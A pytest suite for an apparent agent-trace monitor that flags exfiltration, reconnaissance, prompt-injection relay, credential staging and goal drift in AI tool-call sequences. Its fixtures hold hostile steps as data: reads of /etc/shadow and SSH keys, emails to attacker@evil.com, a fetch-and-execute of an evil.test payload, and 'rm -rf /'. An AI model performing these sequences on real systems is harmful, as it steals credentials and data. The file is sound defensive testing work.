"""Tests for dscan.trail — the CWAT (Call Watch) engine.

Every pattern has a positive case (must flag) and a negative case
(must not flag). Negatives assert absence of the *specific* pattern,
since heuristic detectors legitimately co-fire on a single trace.
"""

import json

import pytest

from dscan.trail import Finding, TrailAnalyzer


def call(tool, **params):
    """Build a minimal trace dict shaped like a tracer entry."""
    return {"tool": tool, "params": params, "result": {}}


def patterns(findings):
    return {f.pattern for f in findings}


def by_pattern(findings, pattern):
    return [f for f in findings if f.pattern == pattern]


# ==========================================================================
# Finding dataclass
# ==========================================================================
class TestFinding:
    def test_to_dict_shape(self):
        f = Finding(
            pattern="EXFIL_SEQUENCE",
            severity="high",
            calls_involved=["read_file", "send_email"],
            call_indices=[0, 4],
            message="x",
            confidence=0.8,
        )
        d = f.to_dict()
        assert d == {
            "pattern": "EXFIL_SEQUENCE",
            "severity": "high",
            "calls_involved": ["read_file", "send_email"],
            "call_indices": [0, 4],
            "message": "x",
            "confidence": 0.8,
        }


# ==========================================================================
# PATTERN 1: EXFIL_SEQUENCE
# ==========================================================================
class TestExfilSequence:
    def test_positive(self):
        traces = [
            call("read_file", path="/etc/passwd"),
            call("search_web", query="weather"),
            call("query_db", sql="SELECT * FROM users"),
            call("search_web", query="news"),
            call("send_email", to="x@y.com", body="here is the data"),
        ]
        findings = by_pattern(TrailAnalyzer().analyze(traces), "EXFIL_SEQUENCE")
        assert findings
        f = findings[0]
        assert f.severity == "high"
        assert f.confidence == 0.8
        assert 0 in f.call_indices  # read_file
        assert 4 in f.call_indices  # send_email

    def test_negative_local_write(self):
        traces = [
            call("read_file", path="/tmp/report.txt"),
            call("write_file", path="/tmp/report_copy.txt", content="..."),
        ]
        findings = TrailAnalyzer().analyze(traces)
        assert "EXFIL_SEQUENCE" not in patterns(findings)


# ==========================================================================
# PATTERN 2: RECON_WALK
# ==========================================================================
class TestReconWalk:
    def test_positive(self):
        traces = [
            call("whoami"),
            call("get_permissions", resource="s3"),
            call("execute_code", code="import os; os.system('ls')"),
        ]
        analyzer = TrailAnalyzer(declared_tools=["whoami", "get_permissions"])
        findings = by_pattern(analyzer.analyze(traces), "RECON_WALK")
        assert findings
        assert findings[0].severity == "high"
        assert findings[0].confidence == 0.9

    def test_negative_following_tool_is_declared(self):
        traces = [
            call("get_permissions", resource="s3"),
            call("read_file", path="/tmp/data.txt"),
        ]
        analyzer = TrailAnalyzer(declared_tools=["get_permissions", "read_file"])
        assert "RECON_WALK" not in patterns(analyzer.analyze(traces))

    def test_no_declared_tools_means_no_recon_walk(self):
        # Same shape as the positive, but without declared_tools the
        # detector must stay silent.
        traces = [
            call("get_permissions", resource="s3"),
            call("execute_code", code="rm -rf /"),
        ]
        assert "RECON_WALK" not in patterns(TrailAnalyzer().analyze(traces))


# ==========================================================================
# PATTERN 3: INJECTION_RELAY
# ==========================================================================
class TestInjectionRelay:
    def test_positive(self):
        traces = [
            call("search_web", query="latest AI news"),
            call("send_email", to="attacker@evil.com", body="secret data"),
        ]
        findings = by_pattern(TrailAnalyzer().analyze(traces), "INJECTION_RELAY")
        assert findings
        assert findings[0].severity == "critical"
        assert findings[0].confidence > 0.7

    def test_positive_relay_to_execute(self):
        traces = [
            call("fetch_url", url="https://evil.test/payload"),
            call("execute_code", code="os.system('curl evil')"),
        ]
        findings = by_pattern(TrailAnalyzer().analyze(traces), "INJECTION_RELAY")
        assert findings
        assert findings[0].severity == "critical"

    def test_negative_search_then_search(self):
        traces = [
            call("search_web", query="AI news"),
            call("search_web", query="security news"),
            call("search_web", query="python news"),
        ]
        assert "INJECTION_RELAY" not in patterns(TrailAnalyzer().analyze(traces))

    def test_negative_send_outside_relay_window(self):
        traces = [
            call("search_web", query="news"),
            call("read_file", path="/tmp/a"),
            call("read_file", path="/tmp/b"),
            call("read_file", path="/tmp/c"),
            call("send_email", to="x@y.com", body="..."),  # 4 hops later
        ]
        # relay_window is 3, so the send is too far from the untrusted read.
        assert "INJECTION_RELAY" not in patterns(TrailAnalyzer().analyze(traces))


# ==========================================================================
# PATTERN 4: DATA_STAGING
# ==========================================================================
class TestDataStaging:
    def test_positive(self):
        traces = [
            call("read_file", path="/etc/passwd"),
            call("read_file", path="/etc/shadow"),
            call("read_file", path="/home/user/.ssh/id_rsa"),
            call("read_file", path="/var/log/auth.log"),
        ]
        findings = by_pattern(TrailAnalyzer().analyze(traces), "DATA_STAGING")
        assert findings
        assert findings[0].severity == "medium"
        assert findings[0].confidence == 0.75

    def test_negative_same_file_repeated(self):
        traces = [
            call("read_file", path="/tmp/report.txt"),
            call("read_file", path="/tmp/report.txt"),
            call("read_file", path="/tmp/report.txt"),
        ]
        assert "DATA_STAGING" not in patterns(TrailAnalyzer().analyze(traces))

    def test_negative_send_breaks_staging(self):
        # A send between reads means the reads are not silently staged.
        traces = [
            call("read_file", path="/a"),
            call("send_email", to="x@y.com", body="1"),
            call("read_file", path="/b"),
            call("read_file", path="/c"),
        ]
        assert "DATA_STAGING" not in patterns(TrailAnalyzer().analyze(traces))

    def test_distinct_sql_tables_count(self):
        traces = [
            call("query_db", sql="SELECT * FROM users"),
            call("query_db", sql="SELECT * FROM secrets"),
            call("query_db", sql="SELECT * FROM billing"),
        ]
        assert "DATA_STAGING" in patterns(TrailAnalyzer().analyze(traces))

    def test_web_reads_do_not_count_as_staging(self):
        traces = [
            call("search_web", query="a"),
            call("search_web", query="b"),
            call("search_web", query="c"),
        ]
        assert "DATA_STAGING" not in patterns(TrailAnalyzer().analyze(traces))

    def test_distinct_reads_outside_window_do_not_stage(self):
        # Three distinct reads, but a window of 2 means no 3 of them ever
        # co-occur within a single sliding window.
        traces = [
            call("read_file", path="/a"),
            call("read_file", path="/b"),
            call("read_file", path="/c"),
        ]
        analyzer = TrailAnalyzer(window=2)
        assert "DATA_STAGING" not in patterns(analyzer.analyze(traces))


# ==========================================================================
# PATTERN 5: GOAL_DRIFT
# ==========================================================================
class TestGoalDrift:
    def test_positive(self):
        analyzer = TrailAnalyzer(goal="summarize the document")
        traces = [
            call("delete_file", path="/important/file.txt"),
            call("send_email", to="x@y.com", body="done"),
        ]
        findings = by_pattern(analyzer.analyze(traces), "GOAL_DRIFT")
        assert findings
        assert findings[0].severity == "medium"
        assert findings[0].confidence == 0.7

    def test_negative_send_matches_goal(self):
        analyzer = TrailAnalyzer(goal="send the weekly report")
        traces = [
            call("read_file", path="/reports/weekly.txt"),
            call("send_email", to="team@company.com", body="report"),
        ]
        assert "GOAL_DRIFT" not in patterns(analyzer.analyze(traces))

    def test_no_goal_means_no_drift(self):
        traces = [call("delete_file", path="/x"), call("send_email", to="a@b.c", body="")]
        assert "GOAL_DRIFT" not in patterns(TrailAnalyzer().analyze(traces))

    def test_read_before_action_is_not_drift(self):
        # Read-only goal, but the agent reads first, then sends — plausible.
        analyzer = TrailAnalyzer(goal="summarize the document")
        traces = [
            call("read_file", path="/doc.txt"),
            call("send_email", to="x@y.com", body="summary"),
        ]
        assert "GOAL_DRIFT" not in patterns(analyzer.analyze(traces))

    def test_read_only_goal_with_only_reads_is_not_drift(self):
        analyzer = TrailAnalyzer(goal="summarize the document")
        traces = [
            call("read_file", path="/doc.txt"),
            call("read_file", path="/doc2.txt"),
        ]
        assert "GOAL_DRIFT" not in patterns(analyzer.analyze(traces))


# ==========================================================================
# Category heuristics
# ==========================================================================
class TestCategoryHeuristics:
    @pytest.mark.parametrize(
        "tool,expected",
        [
            ("read_file", "read"),
            ("search_web", "read"),
            ("query_db", "read"),
            ("list_buckets", "read"),
            ("write_file", "write"),
            ("store_data", "write"),
            ("update_record", "write"),
            ("send_email", "send"),
            ("upload_blob", "send"),
            ("publish_event", "send"),
            ("delete_file", "delete"),
            ("truncate_table", "delete"),  # delete beats execute ("run" in truncate)
            ("execute_code", "execute"),
            ("run_shell", "execute"),
            ("get_permissions", "recon"),  # recon beats read ("get")
            ("whoami", "recon"),
            ("describe_instances", "recon"),
        ],
    )
    def test_builtin_inference(self, tool, expected):
        assert TrailAnalyzer()._category(tool) == expected

    def test_unknown_tool_has_no_category(self):
        assert TrailAnalyzer()._category("frobnicate") is None

    def test_tool_categories_override(self):
        analyzer = TrailAnalyzer(tool_categories={"grab": "read", "beam": "send"})
        # 'grab' would otherwise be uncategorized; override makes it a read.
        assert analyzer._category("grab") == "read"
        assert analyzer._category("beam") == "send"
        traces = [call("grab", path="/secret"), call("beam", to="remote")]
        assert "EXFIL_SEQUENCE" in patterns(analyzer.analyze(traces))


# ==========================================================================
# Incremental analysis
# ==========================================================================
class TestIncremental:
    def test_injection_detected_on_second_call(self):
        a = TrailAnalyzer()
        first = a.analyze_incremental(call("search_web", query="x"))
        assert "INJECTION_RELAY" not in patterns(first)
        second = a.analyze_incremental(call("send_email", to="e@e.com", body="d"))
        assert "INJECTION_RELAY" in patterns(second)

    def test_state_accumulates(self):
        a = TrailAnalyzer()
        a.analyze_incremental(call("search_web", query="x"))
        a.analyze_incremental(call("send_email", to="e@e.com", body="d"))
        assert len(a.buffer) == 2

    def test_never_returns_same_finding_twice(self):
        a = TrailAnalyzer()
        a.analyze_incremental(call("search_web", query="x"))
        a.analyze_incremental(call("send_email", to="e@e.com", body="d"))
        third = a.analyze_incremental(call("read_file", path="/tmp/x"))
        assert not any(
            f.pattern == "INJECTION_RELAY" and sorted(f.call_indices) == [0, 1]
            for f in third
        )

    def test_reset_clears_state(self):
        a = TrailAnalyzer()
        a.analyze_incremental(call("search_web", query="x"))
        a.analyze_incremental(call("send_email", to="e@e.com", body="d"))
        a.reset()
        assert a.buffer == []
        # After reset, the same sequence can be detected fresh again.
        a.analyze_incremental(call("search_web", query="x"))
        again = a.analyze_incremental(call("send_email", to="e@e.com", body="d"))
        assert "INJECTION_RELAY" in patterns(again)


# ==========================================================================
# Misc / robustness
# ==========================================================================
class TestRobustness:
    def test_empty_traces(self):
        assert TrailAnalyzer().analyze([]) == []

    def test_missing_fields_do_not_crash(self):
        assert TrailAnalyzer().analyze([{}, {"tool": "x"}]) == []

    def test_target_extraction_fallbacks(self):
        a = TrailAnalyzer()
        # Non-dict params -> stringified.
        assert a._target({"tool": "x", "params": "literal"}) == "literal"
        # Dict with no recognized target key -> stable JSON.
        assert a._target({"tool": "x", "params": {"foo": "bar"}}) == '{"foo": "bar"}'
        # Empty params -> sentinel.
        assert a._target({"tool": "x", "params": {}}) == "<none>"

    def test_empty_tool_name_has_no_category(self):
        assert TrailAnalyzer()._category("") is None

    def test_findings_are_deduplicated(self):
        traces = [
            call("read_file", path="/etc/passwd"),
            call("send_email", to="x@y.com", body="d"),
        ]
        findings = TrailAnalyzer().analyze(traces)
        keys = [(f.pattern, tuple(sorted(f.call_indices))) for f in findings]
        assert len(keys) == len(set(keys))


# ==========================================================================
# Integration with @watch
# ==========================================================================
class TestWatchIntegration:
    async def test_trail_findings_written_and_flagged(self, tmp_path, monkeypatch):
        monkeypatch.setenv("DSCAN_TRACES_DIR", str(tmp_path))
        monkeypatch.delenv("DSCAN_AGENT_NAME", raising=False)

        from dscan import watch

        analyzer = TrailAnalyzer()

        @watch.tool
        async def search_web(query):
            return {"results": ["..."]}

        @watch.tool
        async def send_email(to, body):
            return {"sent": True}

        @watch(trail=analyzer, name="relay_agent")
        async def agent():
            await search_web(query="latest news")
            await send_email(to="attacker@evil.com", body="secret")
            return "done"

        assert await agent() == "done"

        (path,) = list(tmp_path.glob("*relay_agent.ndjson"))
        entries = [json.loads(line) for line in path.read_text().splitlines() if line.strip()]

        # trail_findings key exists on every written trace entry.
        assert all("trail_findings" in e for e in entries)

        send = next(e for e in entries if e["tool"] == "send_email")
        assert send["flagged"] is True
        assert send["flag_reason"].startswith("trail:")
        assert any(f["pattern"] == "INJECTION_RELAY" for f in send["trail_findings"])

    async def test_no_trail_means_no_trail_findings_key(self, tmp_path, monkeypatch):
        monkeypatch.setenv("DSCAN_TRACES_DIR", str(tmp_path))
        monkeypatch.delenv("DSCAN_AGENT_NAME", raising=False)

        from dscan import watch

        @watch.tool
        async def search_web(query):
            return {"results": []}

        @watch(name="plain_agent")
        async def agent():
            await search_web(query="x")
            return "ok"

        await agent()
        (path,) = list(tmp_path.glob("*plain_agent.ndjson"))
        entries = [json.loads(line) for line in path.read_text().splitlines() if line.strip()]
        assert entries
        assert all("trail_findings" not in e for e in entries)
